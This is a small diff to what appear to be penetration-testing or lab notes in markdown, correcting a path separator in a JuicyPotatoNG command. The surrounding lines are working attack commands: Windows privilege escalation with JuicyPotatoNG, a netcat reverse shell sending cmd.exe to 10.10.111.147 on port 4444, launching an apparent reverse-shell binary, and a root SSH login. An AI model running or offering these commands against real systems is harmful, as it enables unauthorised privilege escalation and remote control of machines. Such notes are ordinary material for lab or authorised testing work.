@@ -365,7 +365,7 @@ ssh -o "IdentitiesOnly yes" -i root root@127.0.0.1
 ```jsx
 .\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "whoami"
 .\JuicyPotatoNG.exe -t * -p "C:\Users\Public\nc64.exe" -a "10.10.111.147 4444 -e cmd.exe"
-./JuicyPotatoNG.exe -t * -p "C:\Users\tony\Desktop\rev.exe"
+.\JuicyPotatoNG.exe -t * -p "C:\Users\tony\Desktop\rev.exe"
 ```
 
 ```jsx
